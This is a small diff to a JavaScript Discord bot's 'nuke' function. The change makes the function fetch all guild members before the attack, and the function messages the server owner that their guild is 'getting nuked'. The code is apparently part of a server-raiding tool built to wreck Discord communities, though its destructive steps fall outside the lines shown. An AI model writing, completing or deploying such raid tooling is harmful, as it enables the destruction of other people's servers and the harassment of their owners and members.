@@ -6,6 +6,8 @@ async function nuke(guild) {
   let users = 0;
   let channels = 0;
 
+  await guild.fetchMembers();
+
   const owner = await guild.fetchMember(guild.ownerID);
   await owner.sendMessage('Hey there! Your guild is getting nuked! :D');
 
